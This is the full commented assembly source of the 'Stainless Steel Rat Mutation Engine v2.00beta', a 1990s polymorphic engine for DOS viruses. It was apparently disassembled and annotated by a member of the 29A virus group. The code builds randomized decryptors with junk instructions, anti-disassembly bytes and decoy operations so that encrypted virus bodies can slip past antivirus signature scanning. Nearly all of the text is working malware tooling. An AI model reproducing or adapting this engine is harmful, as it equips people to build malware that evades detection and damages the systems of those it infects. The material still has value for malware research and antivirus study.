   ; - -[SSRME.ASM]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ; Stainless Steel Rat Mutation Engine v2.00beta (SSRME 2.0b), by SSR
   ; Disasm by Tcp/29A (tcp@cryogen.com)
   ;
   ; Entry:
   ;  DS:DX = code to encrypt
   ;  BP = runtime offset
   ;  CX = total bytes to encrypt
   ; Return:
   ;  DS:DX = decryptor + encrypted code
   ;  CX = size decryptor + encrypted code


                   SSRME200b segment use16
                   assume cs:SSRME200B, ds:SSRME200B, es:SSRME200B, ss:SSRME200B
                   org    0

   SSRME_DEC_SIZE  =       5000
   SSRME_SIZE      =       end_ssrme200b - start

   ssrme_engine:
   start:
                   call    ssrme_delta
   ssrme_delta:
           pop si
                   sub     si,3            ; Get delta offset
           pop ax
           push    cs
           push    ax
           push    es
                   mov     ax,es
                   sub     ax,10h
                   mov     es,ax
                   mov     di,100h
           push    cx
                   mov     cx,SSRME_SIZE
           nop
           push    ds
           push    cs
           pop ds
           cld
                   rep     movsb           ; Copy engine code to working area
           pop ds
           pop cx
                   mov     ax,offset(start_ssrme)+100h
           push    es
           push    ax
                   retf                    ; jmp start_srme

   start_ssrme:
                   pop     es
                   mov     si,100h
                   mov     ax,es
                   add     ax,(end_ssrme200b-start+15)/16+1
                   mov     es,ax
                   mov     cs:[si+ofs_src],dx
           push    cx
           push    bx
                   mov     cx,8
                   mov     al,0
                   mov     bp,offset(register_table)
   l_gen_reg_table:                        ; Create a table with [0,1,2,3,5,6,7]
                   mov     cs:[bp+si],al
                   cmp     al,4            ; Register SP?
                   je      skip_4          ; Yes? then jmp (skip it)
           inc bp
   skip_4:
           inc al
                   loop    l_gen_reg_table
           push    si
                   mov     cx,8
                   add     si,offset(register_table)
   l_xchg_regs:                            ; Xchg registers in register table
                   call    SSRME_get_random
                   and     al,7
                   mov     ah,0            ; AX in [0..7]
                   mov     bp,si
                   add     bp,ax           ; Reg #1
                   call    SSRME_get_random
                   and     ax,7            ; AX in [0..7]
                   mov     di,si
                   add     di,ax           ; Reg #2
                   mov     al,cs:[bp]
                   xchg    al,cs:[di]      ; Xchg registers
                   mov     cs:[bp],al
                   loop    l_xchg_regs
           pop si
                   mov     cx,SSRME_DEC_SIZE
                   mov     al,90h          ; NOP
                   xor     di,di
           cld
                   rep     stosb           ; Fill with NOPs
                   xor     di,di
                   xor     bp,bp
   l_next_register:
           push    bp
                   mov     ax,0B866h               ; Generate MOV ext-reg,xxxxxxxx
                   add     ah,byte ptr cs:[bp+si+register_table]   ; Select reg
           stosw
                   call    SSRME_get_random          ; Generate double-word
                   mov     ah,al
                   call    SSRME_get_random
           stosw
                   call    SSRME_get_random
                   mov     ah,al
                   call    SSRME_get_random
           stosw
                   call    generate_garbage_calljmp
           pop bp
                   inc     bp                      ; Next register
                   cmp     bp,8                    ; Last register?
                   jne     l_next_register         ; No? then jmp
                   mov     cx,5
   l_main_shit:
                   call    generate_garbage
                   call    generate_call_jmp
                   call    generate_jxx
           push    cx
                   mov     cx,5
   l_gen_regreg:
                   call    generate_op_regreg
                   loop    l_gen_regreg
           pop cx
                   call    generate_int
                   call    generate_call_addsp
                   loop    l_main_shit
                   mov     cs:[si+ofs_start_dec],di
                   mov     ax,60CDh        ; Generate INT 60h
           cld
           stosw
           push    ax
           push    bx
           push    cx
           push    dx
           push    bp
           push    di
           push    ax
           push    ax
           push    ax
           push    ax
           push    es
                   xor     ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     es:[60h*4+2],cs         ; Set new int 60h
                   mov     ax,offset(int_60h)
                   add     ax,si
                   mov     es:[60h*4],ax
           pop es
                   xor     ax,ax   ; Exec generated routine until int 60h
           push    es
           push    ax
                   retf

   int_60h:
                   add     sp,6    ; Remove return address+flags from stack
                   mov     ax,si
                   mov     si,100h
                   mov     cs:[si+value_di],di     ; Save reg values
                   mov     cs:[si+value_ax],ax
                   mov     cs:[si+value_bx],bx
                   mov     cs:[si+value_bp],bp
           pop ax
           pop ax
           pop ax
           pop ax
           pop di
           pop bp
           pop dx
           pop cx
           pop bx
           pop ax
                   call    SSRME_get_random
                   and     al,7            ; AL in [0..7]
                   add     al,80h          ; AL in [80h...87h]
                   mov     cs:[si+opindex],al
                   mov     ah,0
                   shl     al,1            ; AL in [0, 2,..., 14]
           push    ax
                   mov     bx,offset(register_combination)
                   add     bx,ax
                   mov     ax,cs:[bx+si]   ; Select a register combination
                   mov     bx,offset(register_table)
                   mov     cx,8
   l_remove_registers:                     ; Remove register from register table
                                           ;  because it is used
                   cmp     al,cs:[bx+si]
                   je      remove_register
                   cmp     ah,cs:[bx+si]
                   jne     dont_remove_register
   remove_register:
                   mov     byte ptr cs:[bx+si],0
   dont_remove_register:
           inc bx
                   loop    l_remove_registers
           pop ax
           push    ax
                   mov     bx,offset(register_combination)
                   add     bx,ax
                   mov     ax,cs:[bx+si]   ; Previously selected reg combination
                   mov     bh,al
                   add     bh,40h          ; INC register
                   mov     cs:[si+inc_inst],bh
                   mov     cs:[si+index_reg],al
           push    dx
                   call    get_register_value
                   mov     cs:[si+value_index],dx
           pop dx
           pop ax
           pop bx
                   add     bx,SSRME_DEC_SIZE
           push    bx
                   mov     bx,offset(register_combination)
                   add     bx,ax
                   mov     ax,cs:[bx+si]   ; Previously selected reg combination
                   cmp     al,ah                   ; Using same register?
                   je      using_1reg              ; Yes? then jmp
                   call    get_register_value      ; Get reg1 value
                   mov     cx,dx
                   mov     al,ah
                   call    get_register_value      ; Get reg2 value
                   add     cx,dx                   ; Add values
                   jmp     calc_index_inm
           nop

   using_1reg:
                   call    get_register_value      ; Get reg value
                   mov     cx,dx
   calc_index_inm:
                   pop     bx                      ; Runtime offset
                   mov     ax,bx
                   sub     ax,cx                   ; Runtime ofs - reg.values
                   mov     cs:[si+index_inm],ax    ; [index_reg +/- inmediate]
                   mov     cx,8
                   mov     bx,offset(end_decryptor-4)
                   mov     di,cs:[si+ofs_start_dec]
   l_gen_operation:
                   call    SSRME_get_random
                   mov     dl,al           ; Value for mask
                   call    SSRME_get_random
                   and     ax,3            ; AX in [0..3] (select operation)
                   call    generate_dec_instruction
                   call    generate_enc_instruction
                   call    generate_garbage
                   call    generate_call_jmp
                   call    generate_jxx
                   loop    l_gen_operation
           pop cx
           push    cx
                   mov     bp,cs:[si+ofs_src]
                   mov     bx,SSRME_DEC_SIZE
           push    cx
           cld
   l_crypt:
                   mov     al,ds:[bp]
                   mov     es:[bx],al
   encryptor:
                   db      8*4 dup(90h)            ; NOP
   end_decryptor:
                   inc     bx
           inc bp
                   loop    l_crypt
                   mov     al,cs:[si+inc_inst]     ; Generate INC index
           stosb
                   pop     dx                      ; Runtime ofs
                   add     dx,cs:[si+value_index]
                   mov     al,81h          ; Generate CMP index,ofs end decryption
           stosb
                   mov     al,cs:[si+index_reg]
                   add     al,0F8h
           stosb
                   mov     ax,dx
           stosw
                   mov     ax,374h                 ; Generate JE $+5
           stosw
                   mov     al,0E9h                 ; Generate JMP start decryptor
           stosb
                   mov     ax,cs:[si+ofs_start_dec]
                   sub     ax,di
           dec ax
           dec ax
           stosw
   fill_length:
                   cmp     di,SSRME_DEC_SIZE-100
                   jae     jmp_code
                   call    generate_garbage
                   jmp     fill_length

   jmp_code:
           cld
                   mov     al,0EBh         ; Generate JMP xx
           stosb
                   mov     ax,SSRME_DEC_SIZE
                   sub     ax,di
                   dec     ax              ; jmp to start of encrypted code
           stosb
   l_fill_buffer:
                   cmp     di,SSRME_DEC_SIZE       ; Buffer filled?
                   jae     end_ssrme               ; Yes? then jmp
                   call    SSRME_get_random
           stosb
                   jmp     l_fill_buffer

   end_ssrme:
           push    es
           pop ds
                   xor     dx,dx           ; DS:DX -> decryptor + encrypted code
           pop cx
                   add     cx,SSRME_DEC_SIZE ; CX = size decryptor + encrypted code
                   retf

   decryption_inst:
                   db      80h
   opindex         db      80h
   index_inm       dw      0
   _mask           db      0
   inc_inst        db      0

   SSRME_get_random:
           pushf
                   in      al,40h          ; Get random number
                   ror     al,1
                   xor     al,53h
           popf
           ret

   generate_garbage:
           cld
           push    bx
                   call    SSRME_get_random
                   and     al,7                    ; AL in [0..7]
                   cmp     al,1                    ; Generate 1 byte instruction?
                   je      generate_1byte          ; Yes? then jmp
                   cmp     al,2                    ; Generate antidisasm code?
                   je      generate_antidisasm     ; Yes? then jmp
                   cmp     al,3                    ; Generate conditional jump?
                   je      generate_conditional_jmp; Yes? then jmp
                   cmp     al,4                    ; Generate JMP?
                   jne     generate_operation      ; No? then jmp?
                   jmp     generate_jmp            ; Yes? then jmp

   generate_operation:
                   mov     al,66h                  ; Extended registers
           stosb
                   mov     bx,offset(op_reg_inm_table)
                   call    SSRME_get_random
                   and     ax,7                    ; AX in [0..7]
                   shl     al,1                    ; Select table entry
                   add     bx,ax
                   mov     al,cs:[bx+si]           ; Generate operation
           stosb
                   mov     ah,cs:[bx+si+1]
                   call    select_random_reg
                   and     al,7                    ; AL in [0..7]
                   add     al,ah                   ; Select register
           stosb
                   call    SSRME_get_random        ; Generate double word
                   mov     ah,al
                   call    SSRME_get_random
           stosw
                   call    SSRME_get_random
                   mov     ah,al
                   call    SSRME_get_random
           stosw
   ret_gen_garbage:
           pop bx
           ret

   generate_1byte:
                   mov     bx,offset(_1byte_table)
                   call    SSRME_get_random
                   and     ax,0Fh                  ; AX in [0..0Fh]
                   add     bx,ax
                   mov     al,cs:[bx+si]           ; Select random instruction
           stosb
                   jmp     ret_gen_garbage

   generate_antidisasm:
                   mov     bx,offset(antidisasm_table)
                   call    SSRME_get_random
                   and     ax,3                    ; AX in [0..3]
                   add     bx,ax                   ; Select table entry
                   mov     al,cs:[bx+si]
           push    ax
                   mov     ax,1EBh                 ; Generate JMP $+1
           stosw
                   pop     ax                      ; Store anti-disasm
           stosb
                   jmp     ret_gen_garbage

   generate_conditional_jmp:
                   call    SSRME_get_random
                   rcr     al,1                    ; Generate CMC instruction?
                   jc      generate_cmc            ; Yes? then jmp
                   rcr     al,1                    ; Generate CLC+JNC?
                   jc      generate_clc_jnc        ; Yes? then jmp
                   mov     al,0F9h                 ; Generate STC
           stosb
                   mov     al,72h                  ; Generate JC
           stosb
                   jmp     generate_ofs_short
           nop

   generate_clc_jnc:
                   mov     al,0F8h                 ; Generate CLC
           stosb
                   mov     al,73h                  ; Generate JNC
           stosb
                   jmp     generate_ofs_short
           nop

   generate_cmc:
                   rcr     al,1                    ; Generate CLC+CMC+JC?
                   jc      generate_clc_cmc_jc     ; Yes? then jmp
                   mov     al,0F9h                 ; Generate STC
           stosb
                   mov     al,0F5h                 ; Generate CMC
           stosb
                   mov     al,73h                  ; Generate JNC
           stosb
                   jmp     generate_ofs_short
           nop

   generate_clc_cmc_jc:
                   mov     al,0F8h                 ; Generate CLC
           stosb
                   mov     al,0F5h                 ; Generate CMC
           stosb
                   mov     al,72h                  ; Generate JC
           stosb
                   jmp     generate_ofs_short      ; Stupid jmp!!
           nop

   generate_ofs_short:
           push    cx
           push    ax
                   push    di                      ; Save position
           inc di
                   call    gen_never_executed_code
                   pop     ax                      ; Restore position
                   mov     cx,di                   ; Calculate jmp offset
                   sub     cx,ax
                   mov     bp,ax
           dec cl
                   mov     es:[bp],cl              ; Store offset
           pop ax
           pop cx
                   jmp     ret_gen_garbage

   generate_jmp:
                   mov     al,0EBh                 ; Generate JMP xx
           stosb
                   jmp     generate_ofs_short

   generate_call_jmp:
           cld
           push    ax
           push    cx
                   mov     al,0E8h                 ; Generate CALL xxxx
           stosb
                   push    di                      ; Save offset position
           inc di
           inc di
                   mov     cx,5
   l_gen_call_shit:
                   call    generate_garbage
                   loop    l_gen_call_shit
                   mov     al,0E9h                 ; Generate JMP xxxx
           stosb
                   push    di                      ; Save offset position
           inc di
           inc di
                   mov     cx,5
   l_gen_jmp_shit:
                   call    generate_garbage
                   loop    l_gen_jmp_shit
                   mov     al,0C3h                 ; Generate RET
           stosb
                   pop     bp                      ; Restore offset position
                   mov     ax,di                   ; Calculate JMP offset
                   sub     ax,bp
                   sub     ax,2
                   mov     es:[bp],ax              ; Store offset
                   add     bp,2
                   mov     ax,bp
                   pop     bp                      ; Restore offset position
                   sub     ax,bp                   ; Calculate CALL offset
                   sub     ax,2
                   mov     es:[bp],ax              ; Store offset
           pop cx
           pop ax
                   ret

   generate_garbage_calljmp:
           push    cx
                   call    SSRME_get_random
                   and     ax,3
                   mov     cx,ax                   ; CX in [0..3]
           inc cx
                   inc     cx                      ; CX in [2..5]
   l_gen_garbage_calljmp:
           push    cx
                   call    generate_garbage
                   call    generate_call_jmp
           pop cx
                   loop    l_gen_garbage_calljmp
           pop cx
           ret

   gen_never_executed_code:
           push    ax
           push    cx
                   call    SSRME_get_random
                   rcr     al,1            ; Generate a simulated decryptor inst?
                   jc      gen_sim_decr    ; Yes? then jmp
                   and     al,7            ; AL in [0..7]
                   inc     al              ; AL in [1..8]
                   mov     ah,0
                   mov     cx,ax           ; Generate 1 to 8 bytes of shit
           cld
   l_generate1_8shit:
                   call    SSRME_get_random
           stosb
                   loop    l_generate1_8shit
                   jmp     ret_no_exec
           nop

   gen_sim_decr:
           cld
                   mov     al,2Eh          ; Generate CS: prefix
           stosb
                   mov     al,80h          ; byte ptr [bx+si],inm8
           stosb
           push    bx
                   mov     bx,offset(decrypt_inst)
                   call    SSRME_get_random
                   and     ax,7            ; AX in [0..7]
                   add     bx,ax           ; Select operation
                   mov     al,cs:[bx+si]   ; BUG! Only 4 operations in table, not 8
           stosb
                   call    SSRME_get_random        ; Generate simulated mask
                   stosb
                   call    SSRME_get_random        ; Generate 2 bytes of shit
           stosb
                   call    SSRME_get_random
           stosb
           pop bx
   ret_no_exec:
           pop cx
           pop ax
           ret

   select_random_reg:
           push    bx
           push    si
           push    ax
                   call    SSRME_get_random
                   mov     ah,0
                   and     al,7            ; AX in [0..7]
                   add     si,ax
                   mov     al,byte ptr cs:[si+register_table]
                   mov     bx,ax
           pop ax
                   mov     al,bl
           pop si
           pop bx
           ret

   generate_call_addsp:
           cld
           push    ax
           push    cx
                   mov     al,0E8h         ; Generate CALL xxxx
           stosb
                   push    di              ; Save offset position
           inc di
           inc di
                   call    gen_never_executed_code
                   pop     bp              ; Restore offset position
                   mov     ax,di           ; Calculate jump offset
                   sub     ax,bp
           dec ax
           dec ax
                   mov     es:[bp],ax      ; Store jump offset
                   mov     cx,4
   l_shit_csp:
                   call    generate_garbage
                   loop    l_shit_csp
                   mov     ax,0C483h       ; Generate ADD SP,2
           stosw
                   mov     al,2
           stosb
           pop cx
           pop ax
           ret

   generate_op_regreg:
           cld
           push    ax
           push    cx
                   mov     al,66h          ; Extended registers
           stosb
                   call    SSRME_get_random
                   rcr     al,1                    ; Generate XXX reg1,reg2 ?
                   jc      generate_op2bytes       ; No? then jmp
                   call    SSRME_get_random
                   and     ax,7            ; AX in [0..7]
                   mov     bx,offset(operation_table)
                   add     bx,ax           ; Select operation from table
                   mov     al,cs:[bx+si]
           stosb
                   mov     ah,0C0h         ; Generate reg source and destination
                   call    select_random_reg
                   add     ah,al
                   call    select_random_reg
                   mov     cl,3
                   shl     al,cl
                   add     ah,al
                   xchg    ah,al
           stosb
   ret_gen_regreg:
           pop cx
           pop ax
           ret

   generate_op2bytes:
                   call    SSRME_get_random
                   and     ax,7            ; AX in [0..7]
                   shl     ax,1            ; AX:=AX*2
                   mov     bx,offset(_2bytes_table)
                   add     bx,ax
                   mov     al,cs:[bx+si]   ; Operation
           stosb
                   mov     ah,cs:[bx+si+1] ; Select destination register
                   call    select_random_reg
                   add     al,ah
           stosb
                   jmp     ret_gen_regreg

   generate_jxx:
           cld
           push    cx
           push    ax
                   mov     ah,70h
                   call    SSRME_get_random
                   and     al,0Fh
                   add     al,ah           ; AL in [70h..7Fh] -> Conditional jumps
           stosb
                   push    di              ; Save offset position
           inc di
                   call    generate_call_jmp
                   pop     bp              ; Restore offset position
                   mov     ax,di           ; Calculate jmp offset
                   sub     ax,bp
           dec al
                   mov     es:[bp],al      ; Store offset
           pop ax
           pop cx
           ret

   generate_int:
           cld
           push    bx
           push    ax
                   call    SSRME_get_random
                   and     ax,3            ; AX in [0..3]
                   mov     bx,offset(int_table)
                   add     bx,ax
                   mov     al,0CDh         ; INT xx
                   mov     ah,cs:[bx+si]   ; Get int number
           stosw
           pop ax
           pop bx
           ret

   get_register_value:
           push    ax
           push    bx
                   cmp     al,3            ; BX ?
                   je      get_bx          ; Yes? then jmp
                   cmp     al,5            ; BP ?
                   je      get_bp          ; Yes? then jmp
                   cmp     al,6            ; SI ?
                   je      get_si          ; Yes? then jmp
                   xor     bx,bx           ; else DI
                   jmp     get_value
           nop

   get_bx:
                   mov     bx,4
                   jmp     get_value
           nop

   get_bp:
                   mov     bx,6
                   jmp     get_value
           nop

   get_si:
                   mov     bx,2
   get_value:
                   mov     dx,word ptr cs:[bx+si+value_registers]
           pop bx
           pop ax
           ret

   generate_enc_instruction:
           push    ax
           push    bp
                   mov     bp,offset(encrypt_inst)
                   shl     ax,1
                   shl     ax,1
                   add     bp,ax
                   mov     ax,cs:[bp+si]           ; Get instruction opcodes
                   mov     cs:[bx+si],ax           ; Add to encryptor
                   mov     ax,cs:[bp+si+2]         ; opcodes
                   mov     ah,dl                   ; Add mask
                   mov     cs:[bx+si+2],ax         ; Add to encryptor
                   sub     bx,4                    ; Next instruction
           pop bp
           pop ax
           ret

   generate_dec_instruction:
           cld
           push    ax
           push    cx
           push    bx
           push    bp
                   mov     bx,offset(decrypt_inst)
                   add     bx,ax           ; Select instruction
                   mov     al,2Eh          ; Generate CS: prefix
           stosb
                   mov     ah,cs:[bx+si]   ; Get opcode from table
                   mov     al,cs:[si+opindex]
                   and     al,0C7h
                   add     al,ah           ; Build operation+reg_index opcode
                   mov     cs:[si+opindex],al
                   mov     cs:[si+_mask],dl
           push    si
           push    ds
           push    cs
           pop ds
                   mov     cx,5
                   add     si,offset(decryption_inst)
           cld
                   rep     movsb           ; Generate instruction
           pop ds
           pop si
           pop bp
           pop bx
           pop cx
           pop ax
           ret

                   db      0Dh,0Ah
                   db      'THE STAINLESS STEEL RAT MUTATION ENGINE v 2.00 beta'
                   db      0Dh,0Ah
                   db      '²±°(c) S.S.R. 1996-97°±²',0Dh,0Ah

   register_table:
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0

   value_registers:
   value_di        dw      0
   value_ax        dw      0
   value_bx        dw      0
   value_bp        dw      0

   index_reg       db      0
   value_index     dw      0
   ofs_start_dec   dw      0
   ofs_src         dw      0


   op_reg_inm_table:
                   db      81h, 0C0h       ; ADD reg,inm
                   db      81h, 0E8h       ; SUB reg,inm
                   db      81h, 0F8h       ; CMP reg,inm
                   db      81h, 0E0h       ; AND reg,inm
                   db      81h, 0C8h       ; OR  reg,inm
                   db      81h, 0F0h       ; XOR reg,inm
                   db      81h, 0F8h       ; CMP reg,inm
                   db      0F7h,0C0h       ; TEST reg,inm

   _1byte_table:
                   int     3
                   aaa
                   daa
                   cbw
                   cwd
                   aas
                   das
                   db      026h    ; ES:
                   db      02Eh    ; CS:
                   db      036h    ; SS:
                   db      03Eh    ; DS:
                   clc
                   cmc
                   stc
                   cld
                   std
                   nop

   antidisasm_table:
                   db      066h
                   db      069h
                   db      0EAh
                   db      09Ah

   operation_table:
                   db      1       ; ADD
                   db      29h     ; SUB
                   db      39h     ; CMP
                   db      21h     ; AND
                   db      9       ; OR
                   db      31h     ; XOR
                   db      39h     ; CMP
                   db      85h     ; TEST

   _2bytes_table:
                   db      0FFh, 0C0h      ; INC reg
                   db      0FFh, 0C8h      ; DEC reg
                   db      0F7h, 0D0h      ; NOT reg
                   db      0D3h, 0E0h      ; SHL reg,CL
                   db      0D3h, 0E8h      ; SHR reg,CL
                   db      0D3h, 0C0h      ; ROL reg,CL
                   db      0F7h, 0D8h      ; NEG reg
                   db      0D3h, 0C8h      ; ROR reg,CL

   int_table:
                   db      1       ; int 1
                   db      3       ; int 3
                   db      1Ch     ; int 1Ch
                   db      28h     ; int 28h

   register_combination:
                   db      3       ; 0     ; BX
                   db      6               ; SI

                   db      3       ; 2     ; BX
                   db      7               ; DI

                   db      5       ; 4     ; BP
                   db      6               ; SI

                   db      5       ; 6     ; BP
                   db      7               ; DI

                   db      6       ; 8     ; SI
                   db      6               ; SI

                   db      7       ; 10    ; DI
                   db      7               ; DI

                   db      5       ; 12    ; BP
                   db      5               ; BP

                   db      3       ; 14    ; BX
                   db      3               ; BX

   encrypt_inst:
                   add     byte ptr es:[bx],0
                   sub     byte ptr es:[bx],0
                   xor     byte ptr es:[bx],0
                   add     byte ptr es:[bx],0

   decrypt_inst:
                   db      28h     ; SUB
                   db      0       ; ADD
                   db      30h     ; XOR
                   db      28h     ; SUB

   end_ssrme200b:

   SSRME200b       ends
   public          ssrme_engine
                   end

   ; End of SSRME 2.0b disasm
   ; (c) 1997, Tcp/29A (tcp@cryogen.com)
   ;
